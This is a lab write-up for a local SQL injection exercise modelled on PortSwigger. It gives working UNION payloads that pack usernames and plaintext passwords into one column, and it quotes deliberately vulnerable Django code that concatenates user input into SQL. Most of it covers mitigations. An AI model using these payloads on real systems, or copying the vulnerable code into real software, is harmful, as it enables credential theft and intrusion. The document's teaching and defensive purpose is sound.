# Lab 10 — SQL injection UNION attack, retrieving multiple values in a single column

## 1. Lab overview

| Field | Value |
| --- | --- |
| PortSwigger reference | <https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column> |
| Lab id | `psw-sqli-10-union-single-column` |
| Vulnerability class | SQL Injection — UNION-based data extraction with column fan-in via string concatenation |
| CWE | [CWE-89 — Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html) |
| Backend | SQLite (single-service Django app) |
| Host URL | <http://127.0.0.1:18010/> |
| Flag | `FLAG{psw-sqli-10-union-concat-admin-access}` |

### Objective

The storefront filter runs a `SELECT id, name FROM products` query whose two columns are projected by the driver but whose template only renders column two (see [shop/templates/shop/filter.html:24-27](shop/templates/shop/filter.html#L24-L27)). The attacker must harvest the `administrator` credential pair through that single visible slot, then authenticate at `/login` to reach `/my-account`, which reveals the flag if and only if `is_admin=True`. Because the admin password is a 16-byte `secrets.token_urlsafe` value generated at seed time, only the UNION extraction path works.

---

## 2. Exploit walkthrough

Only one text column (`name`) is rendered. The injection must merge `username` and `password` into that column using the database's string concatenation operator. SQLite and PostgreSQL use `||`, Oracle also uses `||`, and MySQL requires `CONCAT(a, ':', b)`.

**Step 1 — confirm 2 columns and a string-compatible second column**

```http
GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL--+- HTTP/1.1
Host: 127.0.0.1:18010
```

No error — 2 columns confirmed. Swap the second `NULL` for a string literal to confirm it accepts text:

```
/filter?category=Gifts' UNION SELECT NULL,'abc'-- -
```

The rendered results list gains an `abc` tile.

**Step 2 — enumerate the users table via concatenation**

```http
GET /filter?category=Gifts'+UNION+SELECT+NULL,username+||+':'+||+password+FROM+users--+- HTTP/1.1
Host: 127.0.0.1:18010
```

URL-decoded payload:

```
category=Gifts' UNION SELECT NULL, username || ':' || password FROM users-- -
```

Composed SQL executed by the view:

```sql
SELECT id, name
FROM products
WHERE category = 'Gifts' UNION SELECT NULL, username || ':' || password FROM users-- -' AND released = 1
```

The three legitimate `Gifts` products now sit above three attacker-controlled rows, one per user:

```
administrator:<random-16-byte-token>
wiener:peter
carlos:montoya
```

**Step 3 — authenticate as administrator**

```http
POST /login HTTP/1.1
Host: 127.0.0.1:18010
Content-Type: application/x-www-form-urlencoded

username=administrator&password=<extracted-token>
```

The session cookie is set and `GET /my-account` renders the flag, because [shop/views.py:132-135](shop/views.py#L132-L135) gates the flag behind `user.is_admin`.

**Dialect notes**

- MySQL: replace `a || ':' || b` with `CONCAT(a, ':', b)` — MySQL treats `||` as boolean OR unless `PIPES_AS_CONCAT` is set.
- Oracle: `||` works; tables require `FROM dual` for value-only selects.
- The `executed_sql` echo on [shop/templates/shop/filter.html:12](shop/templates/shop/filter.html#L12) confirms exactly what the driver saw.

---

## 3. Vulnerable code

### Endpoint: `GET /filter`

[shop/views.py:60-70](shop/views.py#L60-L70)

```python
def filter_products(request: HttpRequest) -> HttpResponse:
    category = request.GET.get("category", "")

    # 2-column SELECT. Only column 2 (name) is rendered by the
    # template, so the attacker must funnel both username and password
    # through that single slot via string concatenation.
    query = (
        "SELECT id, name "
        "FROM products "
        "WHERE category = '" + category + "' AND released = 1"
    )
```

Problems:

1. `category` comes from the query string with no validation, no escaping, no type check.
2. It is string-concatenated into the SQL text, so everything the attacker writes is parsed as SQL.
3. The projection is two columns, which is the minimum UNION payload size and a boilerplate fan-in target.

[shop/views.py:75-78](shop/views.py#L75-L78)

```python
with connection.cursor() as cursor:
    cursor.execute(query)
    rows = cursor.fetchall()
```

`cursor.execute(query)` is called with a single argument, so the driver has no parameter-binding opportunity.

[shop/views.py:82-85](shop/views.py#L82-L85)

```python
displayed_names = [
    row[TEXT_COLUMN_INDEX] if len(row) > TEXT_COLUMN_INDEX else None
    for row in rows
]
```

Only index `1` is surfaced — this is the single visible column that forces concatenation in the payload.

### Authentication endpoint (safe, but necessary to exploit)

[shop/views.py:106-118](shop/views.py#L106-L118) uses the Django ORM, so the credentials obtained via UNION are the only path to an authenticated session. The `is_admin` check on [shop/views.py:132](shop/views.py#L132) means `wiener` and `carlos` are dead-ends — the attacker must land the `administrator` row specifically.

### Supporting model and seed

- [shop/models.py:18-35](shop/models.py#L18-L35) — `User` model with plaintext `password` (deliberate, per the module docstring).
- [shop/management/commands/seed.py:55-60](shop/management/commands/seed.py#L55-L60) — admin password is a random `secrets.token_urlsafe(16)`, so guessing and rainbow-table lookups are not viable; the SQLi channel is the only route in.
- [shop/management/commands/seed.py:37](shop/management/commands/seed.py#L37) — flag string.

### Template echo of the composed SQL

[shop/templates/shop/filter.html:10-13](shop/templates/shop/filter.html#L10-L13) reflects the fully composed query for teaching, which in a real product would also be a schema-leaking footgun.

---

## 4. Why the vulnerability exists

| Root cause | Effect |
| --- | --- |
| **String concatenation of untrusted `category` into SQL** | Attacker bytes reach the parser as code. `'`, `UNION`, `--` all retain syntactic meaning. |
| **Two-column projection** | Exactly matches the minimal UNION shape. No column-count probing needed beyond a single `NULL,NULL` sanity check. |
| **Template renders only one column** | Forces, rather than prevents, data exfiltration — attackers pack multiple fields through one slot with `\|\|` / `CONCAT`. |
| **Plaintext password storage** | Once a row leaks, the credential is immediately usable; no offline cracking step required. |
| **Authorization gate (`is_admin`) queried against the same DB the attacker can read** | The same table that authenticates the admin also leaks the admin's secret. |
| **`executed_sql` reflected to the browser** | Removes the blind-injection step; the attacker sees their composed query verbatim. |

---

## 5. Code-level mitigation

### 5.1 Parameterise the query

A one-line change stops the injection dead. The driver binds `category` as a value, so `Gifts' UNION SELECT ...` is compared literally against the `category` column and returns nothing.

```python
# shop/views.py — fixed
def filter_products(request: HttpRequest) -> HttpResponse:
    category = request.GET.get("category", "")

    query = (
        "SELECT id, name "
        "FROM products "
        "WHERE category = %s AND released = 1"
    )
    with connection.cursor() as cursor:
        cursor.execute(query, [category])   # parameter list, not concat
        rows = cursor.fetchall()
```

### 5.2 Use the ORM

Hand-rolled SQL is the root cause. Django's query compiler always binds parameters.

```python
from .models import Product

def filter_products(request: HttpRequest) -> HttpResponse:
    category = request.GET.get("category", "")
    products = (
        Product.objects
        .filter(category=category, released=True)
        .values("id", "name")
    )
```

### 5.3 Allow-list the category

`category` is drawn from a known closed set. Reject anything else before the query runs:

```python
ALLOWED_CATEGORIES = {"Accessories", "Tech", "Lifestyle", "Gifts", "Pets", "Clothing"}

def filter_products(request):
    category = request.GET.get("category", "")
    if category not in ALLOWED_CATEGORIES:
        return HttpResponseBadRequest("unknown category")
    ...
```

### 5.4 Hash passwords with a modern KDF

Even a successful UNION leak should surface only password hashes, not plaintext. Use Django's auth user model (`django.contrib.auth`) or at minimum `django.contrib.auth.hashers.make_password` (Argon2 preferred, PBKDF2 acceptable). An attacker who extracts `$argon2id$v=19$...` cannot reuse it at `/login` without cracking.

### 5.5 Stop reflecting the composed SQL

Delete the `executed_sql` context key in [shop/views.py:94](shop/views.py#L94) and the `<pre class="sql">` block in [shop/templates/shop/filter.html:10-13](shop/templates/shop/filter.html#L10-L13). Error pages must never echo query text in production.

### 5.6 Disable `DEBUG` and pin `ALLOWED_HOSTS`

[sqli_lab/settings.py:18](sqli_lab/settings.py#L18) sets `DEBUG = True` and [sqli_lab/settings.py:20](sqli_lab/settings.py#L20) sets `ALLOWED_HOSTS = ["*"]`. Both are acceptable for a lab and unacceptable in production; Django's debug page leaks SQL, stack frames, and settings.

### 5.7 Separate read-facing projections from sensitive tables

The vulnerable query reads from `products`, yet the attacker can still pivot to `users` because both tables share the same connection. Give the storefront a read-only role that has `SELECT` on `products` only:

```sql
CREATE ROLE shop_reader NOINHERIT LOGIN PASSWORD '...';
GRANT SELECT ON products TO shop_reader;
REVOKE ALL ON users, flags FROM shop_reader;
```

The `/login` endpoint then uses a *different* DB connection/role that has `SELECT` on `users`. A UNION injection in the storefront now returns a permission error instead of credentials.

---

## 6. Network / infrastructure-level mitigation

### 6.1 WAF with OWASP CRS

Rules most relevant to this lab:

- `REQUEST-942-APPLICATION-ATTACK-SQLI` — UNION-based, boolean-based, and comment-sequence patterns (`UNION SELECT`, `' --`, `|| `).
- `REQUEST-920-PROTOCOL-ENFORCEMENT` — oversize query strings, encoding oddities.
- `REQUEST-949-BLOCKING-EVALUATION` — anomaly-score blocking threshold.

Treat a WAF as a latency brake, not a fix.

### 6.2 Least-privilege database accounts

- Application role: `SELECT` on the single table it reads; nothing on `users` / `flags` from the public surface.
- No DDL, no `COPY`, no file-system writes.
- Revoke access to `information_schema`/`sqlite_master` where possible (Postgres: `REVOKE SELECT ON pg_catalog...`).

### 6.3 Network segmentation

- The DB tier must not listen on a public interface. For this lab the app is already bound to loopback only via [docker-compose.yml:10](docker-compose.yml#L10) (`127.0.0.1:18010:8000`).
- Production: DB container on an internal Docker network with no gateway, so even a successful RCE through the DB cannot egress.
- No database secrets in the web container's environment — use short-lived tokens fetched at request time.

### 6.4 Monitoring, rate limiting, and alerting

- Alert on repeated SQL parse errors from a single IP — a strong UNION-probing signal when the attacker is working out column counts.
- Alert on `/filter` response bodies whose size crosses a threshold or that include `:` patterns matching `credential:credential`.
- Rate-limit `/filter` and `/login` per IP and per session; the second curbs credential replay once a UNION leak happens.
- Structured logging (JSON) of every `cursor.execute` with a digest of the final text, so anomalous `UNION`/`||` tokens can be tripwired.

### 6.5 Secrets rotation

The administrator password is generated once by [shop/management/commands/seed.py:55](shop/management/commands/seed.py#L55). In production, rotate service-account credentials on a schedule and on suspicion of compromise; any leaked password has a bounded useful lifetime.

---

## 7. Defense-in-depth checklist

- [ ] Parameterised queries everywhere; no `+`, `%`, or f-string SQL construction.
- [ ] Django ORM by default; raw SQL reviewed and justified.
- [ ] Allow-list validation for enumerable fields (`category`).
- [ ] Passwords stored via Argon2/PBKDF2, never plaintext.
- [ ] Separate DB roles per tier; storefront role cannot read `users`.
- [ ] `DEBUG = False` and a pinned `ALLOWED_HOSTS` in production.
- [ ] Composed SQL never reflected into HTTP responses.
- [ ] WAF in front with OWASP CRS enabled in blocking mode.
- [ ] Rate limits on filter and login endpoints.
- [ ] Alerting on SQL parse errors, oversized result sets, and `:`/`||`/`UNION` tokens in query parameters.
- [ ] SAST (`bandit`, `semgrep`) gating PRs on `cursor.execute(f"...")` and `cursor.execute("..." + x)` patterns.
- [ ] Regular rotation of administrator and service-account secrets.

---

## 8. References

- PortSwigger Web Security Academy — [SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)
- PortSwigger — [SQL injection UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- OWASP — [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- OWASP — [Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
- CWE-89 — <https://cwe.mitre.org/data/definitions/89.html>
- Django docs — [Executing custom SQL directly](https://docs.djangoproject.com/en/5.0/topics/db/sql/#executing-custom-sql-directly)
- OWASP CRS — <https://coreruleset.org/>
